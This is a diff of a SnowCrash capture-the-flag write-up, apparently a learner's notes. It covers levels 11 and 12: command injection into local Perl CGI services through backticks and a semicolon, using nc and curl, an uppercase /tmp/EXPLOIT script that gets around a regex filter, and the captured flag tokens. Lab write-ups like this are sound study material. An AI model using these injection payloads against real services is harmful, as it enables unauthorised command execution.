@@ -73,29 +73,29 @@ level12@SnowCrash:~$ find / -iname "level12" 2>/dev/null | grep -v 'proc'
  # On login we see a perl script that is running a webserver on the port 4646, that can take two get params, x and y.
  	We can clearly were we gonna do the exploit here, there is backquote.
 
-# Lets see if we can exploit it with echo and using nc with our port 5151  and give us the password too and 6969 only gives the flag
-#	Note localhost 5151 is home in networking
-echo '; getflag > /tmp/Gabe ; echo' | nc localhost 5151 && cat /tmp/Gabe
+# lines 9 and 10 is the 2 regex commands
+9   $xx =~ tr/a-z/A-Z/;
+10   $xx =~ s/\s.*//;
+# line 9 convert every alpha characters to their uppercase equivalence,
+# line 10 remove every space.
 
-level11@SnowCrash:~$ echo '; getflag > /tmp/Gabe ; echo' | nc localhost 5151 && cat /tmp/Gabe
-Password: Erf nope..
-Check flag.Here is your token : fa6v5ateaw21peobuub8ipe6s
+# but we can use shell substitution * and create a uppercase file exploit, name /tmp/EXPLOIT, line 9 with 10 /*/EXPLOIT will match it.
+	(don't forget to change permissions)
 
-level11@SnowCrash:~$ echo '; getflag > /tmp/Gabe ; echo' | nc localhost 6969 && cat /tmp/Gabe
-Check flag.Here is your token : fa6v5ateaw21peobuub8ipe6s
+level12@SnowCrash:~$ vim /tmp/EXPLOIT
+#!/bin/sh
+getflag | wall
 
-# Below is another method for solving the same problem.
-level11@SnowCrash:~$ echo '; getflag | wall' | nc localhost 5151
+level12@SnowCrash:~$ chmod 777 /tmp/EXPLOIT
 
-Broadcast Message from flag11@Snow
-        (somewhere) at 9:14 ...
+# Then simply use curl or do a ssh bridge to make a http call.
 
-Check flag.Here is your token : fa6v5ateaw21peobuub8ipe6s
+level12@SnowCrash:~$ curl localhost:4646?x='`/*/EXPLOIT`'
 
-Erf nope..
+Broadcast Message from flag12@Snow
+        (somewhere) at 11:04 ...
 
-# We completely by passed the flag here and got it without cracking it but through an echo exploit that I used in 10 and it wasn't the correct.
-	But it worked for this level11 
+Check flag.Here is your token : g1qKMiRpXf53AWhDaU7FEkczr
 
 
 Resources
